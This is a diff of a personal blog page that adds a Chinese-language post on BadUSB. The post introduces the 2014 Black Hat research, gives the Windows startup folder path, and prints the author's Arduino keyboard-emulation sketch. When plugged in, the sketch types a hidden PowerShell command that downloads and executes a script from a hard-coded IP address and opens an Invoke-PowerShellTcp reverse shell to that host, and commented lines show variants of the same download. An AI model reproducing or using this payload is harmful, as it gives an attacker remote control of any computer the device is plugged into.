@@ -7,6 +7,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <title>
+    BadUsb |
     
     Melon</title>
   
@@ -21,43 +22,8 @@
 
 <body>
 <main class="content">
-  <section class="jumbotron">
-  <div class="video">
-    
-      <div class="video-frame">
-        <img src="/images/ocean/overlay-hero.png" alt="Decorative image frame">
-      </div>
-    
-    <div class="video-media">
-      <video playsinline="" autoplay="" loop="" muted="" data-autoplay=""
-             poster="/images/ocean/ocean.png" x5-video-player-type="h5">
-        <source src="/images/ocean/ocean.mp4" type="video/mp4">
-        <source src="/images/ocean/ocean.ogv" type="video/ogg">
-        <source src="/images/ocean/ocean.webm" type="video/webm">
-        <p>Your user agent does not support the HTML5 Video element.</p>
-      </video>
-      <div class="video-overlay"></div>
-    </div>
-    <div class="video-inner text-center text-white">
-      <h1><a href="/">Melon</a></h1>
-      <p></p>
-      <div><img src="/images/hexo-inverted.svg" class="brand" alt="Melon"></div>
-    </div>
-    <div class="video-learn-more">
-      <a class="anchor" href="#landingpage"><i class="fe fe-mouse"></i></a>
-    </div>
-  </div>
-</section>
-
-<div id="landingpage">
   <section class="outer">
-  <article class="articles">
-    
-    <h1 class="page-type-title"></h1>
-
-    
-      
-        
+  
 
 <article id="post-BadUsb" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
   
@@ -66,9 +32,9 @@
       <header class="article-header">
         
   
-    <h2 itemprop="name">
-      <a class="article-title" href="/2019/04/19/BadUsb/">BadUsb</a>
-    </h2>
+    <h1 class="article-title" itemprop="name">
+      BadUsb
+    </h1>
   
   
 
@@ -86,6 +52,14 @@
         
       </div>
     
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
 
     
 
@@ -107,9 +81,9 @@
 
       
         <p>在2014年美国黑帽大会上，柏林SRLabs的安全研究人员JakobLell和独立安全研究人员Karsten Nohl展示了他们称为“BadUSB”(按照BadBIOS命名)的攻击方法，这种攻击方法让USB安全和几乎所有和USB相关的设备(包括具有USB端口的电脑)都陷入相当危险的状态。</p>
-        
-          <a class="article-more-link" href="/2019/04/19/BadUsb/">阅读全文...</a>
-        
+<a id="more"></a>
+
+<h5 id="Windows系统自启动路径"><a href="#Windows系统自启动路径" class="headerlink" title="Windows系统自启动路径"></a>Windows系统自启动路径</h5><pre><code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><h4 id="附自己的一些代码"><a href="#附自己的一些代码" class="headerlink" title="附自己的一些代码"></a>附自己的一些代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;Keyboard.h&gt; //包含键盘模块头文件</span><br><span class="line">void setup()&#123; //初始化</span><br><span class="line">Keyboard.begin();//开始键盘通信</span><br><span class="line">delay(1000);//延时1000毫秒，</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 </span><br><span class="line">Keyboard.press(&apos;r&apos;);//按下r键 CMD</span><br><span class="line">delay(500); </span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);//松掉win键 </span><br><span class="line">Keyboard.release(&apos;r&apos;);//松掉r键 </span><br><span class="line">Keyboard.println(&quot;cmd&quot;);</span><br><span class="line">delay(500); </span><br><span class="line">//Keyboard.println(&quot;cmd.exe /T:01 /K mode CON: COLS=16 LINES=1&quot;); //缩小窗口</span><br><span class="line">//Keyboard.println(&quot;$clnt = new-object System.Net.WebClient;$url= &apos;http://47.93.12.104/water.ps1&apos;;$file = &apos;D:\\melon.ps1&apos;;$clnt.DownloadFile($url,$file);D:\\melon.ps1;&quot;);</span><br><span class="line">//.println(&quot;powershell -w hidden while(1)&#123;IEX (New-Object Net.WebClient).DownloadString(&apos;D:\\melon.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 47.93.12.104 -port 9999&#125;&quot;);</span><br><span class="line">Keyboard.println(&quot;powershell -w hidden while(1)&#123;IEX (New-Object Net.WebClient).DownloadString(&apos;http://47.93.12.104/water.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 47.93.12.104 -port 9999&#125;&quot;);</span><br><span class="line">Keyboard.press(KEY_RETURN);  //按下回车键</span><br><span class="line">Keyboard.release(KEY_RETURN); //释放回车键</span><br><span class="line">Keyboard.end();//结束键盘通讯 </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">void loop()//循环，这里的代码</span><br><span class="line">&#123; </span><br><span class="line">//循环体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
       
     </div>
     <footer class="article-footer">
@@ -121,21 +95,19 @@
   </div>
 
   
+    
 
+  
+
+  
+    
   
 
 </article>
 
 
 
-      
-  </article>
-  
-
-  
 </section>
-</div>
-
   <footer class="footer">
   <div class="outer">
     <div class="float-right">
@@ -155,8 +127,8 @@
 
 </main>
 
-  <aside class="sidebar">
-    
+<aside class="sidebar sidebar-specter">
+  
     <button class="navbar-toggle"></button>
 <nav class="navbar">
   
@@ -221,6 +193,21 @@
   <script src="/fancybox/jquery.fancybox.min.js"></script>
 
 
+
+  <script src="/js/tocbot.min.js"></script>
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
 
 
 <script src="/js/ocean.js"></script>
